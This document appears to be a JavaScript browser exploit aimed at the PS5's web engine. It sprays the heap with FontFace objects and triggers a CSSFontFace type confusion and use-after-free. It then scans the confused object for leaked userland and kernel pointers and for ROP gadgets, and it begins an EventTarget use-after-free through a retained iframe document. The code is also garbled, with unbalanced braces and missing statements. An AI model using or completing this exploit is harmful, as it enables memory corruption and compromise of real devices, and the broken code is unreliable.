var lockedDocumentRef = null;

// ============================================================
// MEMORY UTILITIES (v63 — Corrected isPointer)
// ============================================================
var Mem = {
    strToHex: function(str, maxLen) {
        if (!maxLen) maxLen = str.length;
        var hex = "";
        for (var i = 0; i < Math.min(str.length, maxLen); i++) {
            var code = str.charCodeAt(i);
            var h = (code & 0xFF).toString(16);
            hex += (h.length === 1 ? "0" + h : h) + " ";
        }
        return hex.trim();
    },
    
    strToU64: function(str) {
        if (!str || str.length < 1) return 0n;
        var val = 0n;
        for (var i = 0; i < Math.min(str.length, 8); i++) {
            var code = BigInt(str.charCodeAt(i) & 0xFF);
            val |= (code << BigInt(i * 8));
        }
        return val;
    },
    
    // CORRECTED: Filters out ASCII string false positives
    // ASCII printable range packed as 32-bit: 0x20202020 to 0x7E7E7E7E
    isPointer: function(val) {
        if (typeof val !== "bigint") return false;
        var lo = Number(val & 0xFFFFFFFFn);
        // Exclude basic ASCII ranges (0x20 to 0x7E packed in 32-bit)
        // This eliminates false positives from strings like "test" (0x74657374)
        if (lo >= 0x20202020 && lo <= 0x7E7E7E7E) return false;
        
        var hi = Number(val >> 32n);
        // PS5 userland pointers: hi=0x0000 or hi=0x0001
        if (hi === 0 || hi === 1) return lo > 0x10000;
        // Kernel pointers: hi=0xFFFF
        if (hi === 0xFFFF) return true;
        return false;
    },
    
    bigToHex: function(val) {
        return "0x" + val.toString(16).padStart(16, "0");
    },
    
    // Check if string contains non-printable ASCII (raw memory indicator)
    hasRawMemory: function(str) {
        for (var i = 0; i < str.length; i++) {
            var c = str.charCodeAt(i);
            if (c < 0x20 || c > 0x7E) return true;
        }
        return false;
    },
    
    findGadgets: function(hexStr) {
        var gadgets = {
            "5f c3": "pop rdi; ret",
            "5e c3": "pop rsi; ret",
            "5a c3": "pop rdx; ret",
            "58 c3": "pop rax; ret",
            "59 c3": "pop rcx; ret",
            "41 58 c3": "pop r8; ret",
            "41 59 c3": "pop r9; ret",
            "0f 05 c3": "syscall; ret",
            "0f 05": "syscall",
            "c3": "ret",
            "48 87 e3": "xchg rsp, rbx",
            "48 94": "xchg rsp, rax",
        };
        var found = [];
        var lower = hexStr.toLowerCase().replace(/\s/g, "");
        for (var pattern in gadgets) {
            var cleanPattern = pattern.replace(/\s/g, "");
            var idx = lower.indexOf(cleanPattern);
            if (idx !== -1 && idx % 2 === 0) {
                found.push({
                    offset: idx / 2,
                    bytes: pattern,
                    name: gadgets[pattern]
                });
            }
        }
        return found;
    }
};

P("════════════════════════════════════","hd");

Hd("Creating heap holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{

fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

Sep();Hd("PHASE 2: Identify Confused Object");Sep();

document.fonts.load("1em trigger, x", "AB").then(function(faces) {
    P("  load() returned " + faces.length + " faces");
    
    var aFamily = null, aFace = null;
    for (var i = 0; i < faces.length; i++) {
        var f = faces[i];
        P("  Face[" + i + "]: family=" + f.family + " weight=" + f.weight);

            aFamily = f.family;
            aFace = f;
        }
    }
    
    if (!aFamily) { Fl("No A_ face found"); return; }
    St("RECLAIMED: " + aFamily);
    keep.push(faces); keep.push(aFace);
    
    var aIndex = -1;
    for (var i = 0; i < sh.cssRules.length; i++) {
        try {
            var r = sh.cssRules[i];
            if (r.type === 5) {

                    aIndex = i; break;
                }
            }
        } catch(e) {}
    }
    if (aIndex === -1) { Fl("CSSRule not found"); return; }
    Ok("Found CSSRule at index " + aIndex);
    var aRule = sh.cssRules[aIndex];
    var aStyle = aRule.style;
    
    aStyle.setProperty("font-weight", "700"); fs();
    if (String(aFace.weight) !== "700") { Fl("Confusion dead"); return; }
    Ok("Confusion ALIVE — weight = 700");
    
    // ============================================================
    // PHASE 3: READ64 SCANNER (Corrected isPointer)
    // ============================================================
    Sep();Hd("PHASE 3: Read64 Scanner (Corrected isPointer)");Sep();
    P("  isPointer now filters ASCII range 0x20202020-0x7E7E7E7E","dm");
    P("  This eliminates false positives from string values","dm");
    P("");
    
    var pointerLeaks = [];
    var gadgetFindings = [];
    var rawMemoryLeaks = [];
    
    // === SCAN 1: Baseline reads with corrected pointer check ===
    Hd("SCAN 1: Baseline reads (corrected filter)");
    
    var testFamilies = [
        "test", "AAAA", "BBBB",
        "\u4141\u4141\u4141\u4141",
        "\u0000\u0000\u0000\u0000",
        "\uFFFF\uFFFF\uFFFF\uFFFF",
        "x", "", "normal", "serif", "monospace"
    ];
    
    for (var ti = 0; ti < testFamilies.length; ti++) {
        var writeVal = testFamilies[ti];
        var writeDisplay = writeVal.length === 0 ? "(empty)" : 
                          writeVal.replace(/[\u0000-\u001F\u007F-\uFFFF]/g, function(c) {
                              return "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0");
                          });
        
        try {
            aStyle.setProperty("font-family", writeVal); fs();
            var readVal = aFace.family;
            var readHex = Mem.strToHex(readVal, 64);
            var readU64 = Mem.strToU64(readVal);
            var isPtr = Mem.isPointer(readU64);
            var hasRaw = Mem.hasRawMemory(readVal);
            
            P("  Write: '" + writeDisplay + "' → Read: '" + 
              (hasRaw ? "(raw memory, " + readVal.length + " bytes)" : readVal) + "'", "dm");
            P("    Hex: " + readHex, "dm");
            P("    U64: " + Mem.bigToHex(readU64), "dm");
            
            if (isPtr) {
                Hi("    ✅ POINTER DETECTED: " + Mem.bigToHex(readU64));
                pointerLeaks.push({
                    writeVal: writeDisplay,
                    readVal: readVal,
                    hex: readHex,
                    ptr: readU64,
                    ptrHex: Mem.bigToHex(readU64),
                    source: "SCAN 1 baseline"
                });
            } else {
                Dm("    (filtered — not a pointer)");
            }
            
            if (hasRaw) {
                Hi("    ✅ RAW MEMORY DETECTED — non-ASCII bytes in return value!");
                rawMemoryLeaks.push({
                    writeVal: writeDisplay,
                    readVal: readVal,
                    hex: readHex,
                    source: "SCAN 1 baseline"
                });
            }
            
            var gadgets = Mem.findGadgets(readHex);
            if (gadgets.length > 0) {
                St("    ROP GADGETS FOUND!");
                for (var gi = 0; gi < gadgets.length; gi++) {
                    P("      @offset " + gadgets[gi].offset + ": " + gadgets[gi].name, "hl");
                    gadgetFindings.push({
                        writeVal: writeDisplay,
                        offset: gadgets[gi].offset,
                        name: gadgets[gi].name,
                        context: readHex
                    });
                }
            }
        } catch(e) {
            Fl("  Error: " + e.message);
        }
        P("");
    }
    
    // === SCAN 2: Stale pointer check ===
    Hd("SCAN 2: Stale pointer check");
    
    aStyle.setProperty("font-family", "marker_value_1"); fs();
    var r1 = aFace.family;
    P("  Read 1: " + r1 + " (hex: " + Mem.strToHex(r1, 32) + ")", "dm");
    
    var r2 = aFace.family;
    P("  Read 2 (same): " + r2 + " (hex: " + Mem.strToHex(r2, 32) + ")", "dm");
    
    aStyle.setProperty("font-family", "marker_value_2"); fs();
    var r3 = aFace.family;
    P("  Read 3 (changed): " + r3 + " (hex: " + Mem.strToHex(r3, 32) + ")", "dm");
    
    var r4 = aFace.family;
    P("  Read 4 (same): " + r4 + " (hex: " + Mem.strToHex(r4, 32) + ")", "dm");
    
    if (r1 !== r2) {
        Hi("  STALE POINTER: Read 1 ≠ Read 2!");
        var staleU64 = Mem.strToU64(r2);
        if (Mem.isPointer(staleU64)) {
            Hi("  STALE POINTER VALUE: " + Mem.bigToHex(staleU64));
            pointerLeaks.push({
                writeVal: "marker_value_1 (stale read 2)",
                readVal: r2,
                hex: Mem.strToHex(r2, 64),
                ptr: staleU64,
                ptrHex: Mem.bigToHex(staleU64),
                source: "SCAN 2 stale pointer"
            });
        }
    }
    P("");
    
    // === SCAN 3: Rapid cycling ===
    Hd("SCAN 3: Rapid family cycling (20 iterations)");
    
    var cycleMismatches = [];
    for (var ci = 0; ci < 20; ci++) {
        try {
            aStyle.setProperty("font-family", "cycle_" + ci); fs();
            var rv = aFace.family;
            var hex = Mem.strToHex(rv, 32);
            var u64 = Mem.strToU64(rv);
            var isPtr = Mem.isPointer(u64);
            var hasRaw = Mem.hasRawMemory(rv);
            
            if (rv !== "cycle_" + ci || isPtr || hasRaw) {
                P("  Cycle " + ci + ": MISMATCH!", "wr");
                P("    Expected: cycle_" + ci, "dm");
                P("    Got: " + (hasRaw ? "(raw memory)" : rv), "dm");
                P("    Hex: " + hex, "dm");
                
                if (isPtr) {
                    Hi("    POINTER: " + Mem.bigToHex(u64));
                    pointerLeaks.push({
                        writeVal: "cycle_" + ci,
                        readVal: rv,
                        hex: hex,
                        ptr: u64,
                        ptrHex: Mem.bigToHex(u64),
                        source: "SCAN 3 cycle " + ci
                    });
                }
                if (hasRaw) {
                    Hi("    RAW MEMORY in return value!");
                    rawMemoryLeaks.push({
                        writeVal: "cycle_" + ci,
                        readVal: rv,
                        hex: hex,
                        source: "SCAN 3 cycle " + ci
                    });
                }
                
                cycleMismatches.push({cycle: ci, expected: "cycle_"+ci, got: rv, hex: hex});
            }
        } catch(e) {}
    }
    
    if (cycleMismatches.length === 0) {
        Dm("  All 20 cycles matched — no stale pointer detected");
    }

    aStyle.setProperty("font-family", "pre_gc_value"); fs();
    var preGC = aFace.family;
    P("  Pre-GC: " + preGC, "dm");

    }

                ptr: postU64,
                ptrHex: Mem.bigToHex(postU64),

        if (beforeVal !== afterVal) {
            Hi("  GC cycle " + gci + ": VALUE CHANGED!");
            P("    Before: " + beforeHex, "dm");
            P("    After:  " + afterHex, "dm");
            
            var afterU64 = Mem.strToU64(afterVal);
            if (Mem.isPointer(afterU64)) {
                Hi("    POINTER: " + Mem.bigToHex(afterU64));
                pointerLeaks.push({
                    writeVal: "gc_test_" + gci,
                    readVal: afterVal,

    // ============================================================
    // PHASE 4: CSSFONTFACE SCANNER SUMMARY
    // ============================================================
    Sep();Hd("PHASE 4: CSSFontFace Scanner Summary");Sep();
    P("");
    P("  Pointer leaks (corrected): " + pointerLeaks.length, pointerLeaks.length > 0 ? "hl" : "dm");
    P("  Raw memory leaks: " + rawMemoryLeaks.length, rawMemoryLeaks.length > 0 ? "hl" : "dm");
    P("  ROP gadgets found: " + gadgetFindings.length, gadgetFindings.length > 0 ? "hl" : "dm");
    P("  Cycle mismatches: " + cycleMismatches.length, cycleMismatches.length > 0 ? "hl" : "dm");
    P("");
    
    if (pointerLeaks.length > 0) {
        St("★ POINTER LEAKS VIA CSSFONTFACE! ★");
        for (var i = 0; i < pointerLeaks.length; i++) {
            P("  [" + i + "] " + pointerLeaks[i].ptrHex + " (source: " + pointerLeaks[i].source + ")");
        }

    if (rawMemoryLeaks.length > 0) {
        St("★ RAW MEMORY LEAKS VIA CSSFONTFACE! ★");
        for (var i = 0; i < rawMemoryLeaks.length; i++) {

    // ============================================================
    // PHASE 5: EVENTTARGET UAF — lockedDocumentRef
    // ============================================================
    Sep();Hd("PHASE 5: EventTarget UAF — lockedDocumentRef");Sep();
    P("  Using lockedDocumentRef to retain JS wrapper","dm");
    P("  while C++ Document is freed and reclaimed","dm");
    P("");
    
    // Reset lockedDocumentRef

    var etPointerLeaks = [];
    var etRawLeaks = [];
    var etGadgets = [];

        var f2 = document.body.appendChild(document.createElement('iframe'));
        var a2 = document.createElement('div');
        var b2 = a2.appendChild(document.createElement('div'));
        
        // CRITICAL: Lock the document reference BEFORE destruction
        lockedDocumentRef = f2.contentDocument;
        P("  lockedDocumentRef set: " + lockedDocumentRef, "dm");
        P("  lockedDocumentRef.URL: " + lockedDocumentRef.URL, "dm");
        P("  lockedDocumentRef.nodeType: " + lockedDocumentRef.nodeType, "dm");
        P("");

        a2.addEventListener('b', function() {
            P("  [L1] Freeing iframe and Document...", "dm");
            document.adoptNode(a2);
            f2.remove();
